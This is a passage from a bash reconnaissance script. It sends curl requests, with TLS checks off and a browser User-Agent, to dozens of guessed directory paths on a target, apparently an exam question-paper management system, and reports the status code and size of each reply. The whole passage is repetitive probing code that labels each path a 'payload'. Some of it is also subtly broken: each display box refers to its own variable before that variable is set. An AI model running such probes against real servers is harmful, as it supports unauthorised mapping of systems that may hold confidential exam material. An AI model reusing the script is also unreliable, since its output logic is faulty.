payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Manager-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Manager-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module_QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module_QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaperAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaperAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Mgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Mgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMasterHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMasterHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitorHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitorHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperCloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperCloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin-Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin-Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ControlQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ControlQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFileProcessingSuite/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFileProcessingSuite/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperMonitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperMonitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPMgmt/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPMgmt/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Transfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Transfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Automation_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Automation_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["System_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"System_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow-Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow-Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAuto-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAuto-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Uploader-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Uploader-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Dashboard/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Dashboard/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QsnPaper-MassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QsnPaper-MassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader-Upload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-Upload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Management_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Management_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl_QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl_QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Portal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Portal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploader_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload_QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload_QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService-FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService-FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPBData/"]: "
